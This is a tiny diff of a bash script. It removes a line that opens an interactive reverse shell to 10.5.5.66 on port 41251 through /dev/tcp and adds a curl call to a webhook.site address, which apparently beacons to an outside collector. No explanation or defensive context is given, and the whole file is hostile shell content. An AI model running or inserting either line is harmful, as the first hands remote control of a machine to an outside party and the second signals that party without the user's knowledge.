@@ -1,2 +1,3 @@
 #!/usr/bin/bash
-bash -i >& /dev/tcp/10.5.5.66/41251 0>&1
+
+curl https://webhook.site/c1ca65e9-889d-4401-8d7b-274ffc4de9fd
